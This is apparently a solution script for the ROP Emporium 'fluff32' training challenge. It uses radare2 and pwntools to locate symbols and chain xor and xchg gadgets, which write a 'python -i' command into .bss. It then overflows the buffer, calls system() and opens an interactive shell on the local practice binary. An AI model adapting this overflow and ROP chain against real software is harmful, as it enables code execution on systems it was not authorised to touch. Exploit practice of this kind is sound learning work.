import r2pipe
from pwn import *
import gadgets

binary = './fluff32'
padding = 44

def hex2int(s):
    return int(s[2:], 16)

r2 = r2pipe.open(binary)
r2.cmd('aaaa')

sections = r2.cmdj('iSj')
bss_addr = None
for sec in sections:
    if sec['name'] == '.bss':
        bss_addr = sec['vaddr']

print(bss_addr)

system_addr = hex2int(r2.cmd('is~system').strip().split()[2])
fgets_addr = hex2int(r2.cmd('is~fgets').strip().split()[2])

# put content here (define payload)

to_send = b'python -i\x00'
#  to_send = b'/usr/bin/bash\x00'
ints = []
while to_send:
    batch, to_send = to_send[:4], to_send[4:]
    ints.append(u32(batch.ljust(4, b'\x00')))

def xchg_edx_ecx():
    payload = p32(0x08048689) # xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret; 
    payload += p32(0x1337c0de)
    return payload


def xor_edx_ebx():
    payload = p32(0x0804867b) # 0x0804867b: xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret
    payload += b'asdf'
    return payload

def xor_edx_edx():
    payload = p32(0x08048671) # 0x08048671: xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
    payload += p32(0x12345678)
    return payload



def assign_mem(addr, val):
    # mov addr to ecx
    payload = gadgets.pop_ebx(addr)
    payload += xor_edx_edx()
    payload += xor_edx_ebx()
    payload += xchg_edx_ecx()

    # mov val to edx
    payload += gadgets.pop_ebx(val)
    payload += xor_edx_edx()
    payload += xor_edx_ebx()

    # mov
    payload += p32(0x08048693) + p32(0xdeadbeef) + p32(0) # mov [ecx], edx
    return payload

payload = b''

print(ints)
for idx, i in enumerate(ints):
    payload += assign_mem(bss_addr + 4 * idx, i)

payload += p32(system_addr)
payload += b'abcd'
payload += p32(bss_addr)


with open('payload.bin', 'wb') as f:
    f.write(b'a' * padding + payload)

log.hexdump(payload)
# end of content
p = process(binary)
p.sendline(b'x' * padding + payload)
p.interactive()
